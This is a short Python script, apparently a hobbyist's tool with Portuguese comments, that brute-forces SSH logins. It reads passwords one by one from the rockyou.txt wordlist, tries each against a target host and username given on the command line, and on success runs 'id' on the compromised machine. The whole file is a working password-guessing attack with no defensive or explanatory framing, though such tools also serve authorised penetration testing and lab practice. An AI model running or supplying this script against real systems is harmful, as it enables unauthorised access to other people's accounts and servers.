import paramiko,sys

if len(sys.argv) <= 2:
    print("Modo de uso: python3 bruteforce-ssh.py 192.168.15.21 user")
else:
    ssh = paramiko.SSHClient()
    ssh.load_system_host_keys() #carregar known_hosts
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) #adicionar known_hosts

    with open('/usr/share/wordlists/rockyou.txt') as wl: #mudar wordlist
        for i in wl:
            try:
                psw=i.strip()
                print(f"Testando ---> {sys.argv[2]}:{psw} ")
                ssh.connect(sys.argv[1], username=sys.argv[2], password=psw)
            except paramiko.ssh_exception.AuthenticationException:
                print("Falha de autenticação.")
            else:
                print(f"[::] Conectado - {psw}")
                stdin, stdout, stderr = ssh.exec_command('id')
                for i in stdout.readlines():
                    print(i.strip())
                break
    ssh.close()

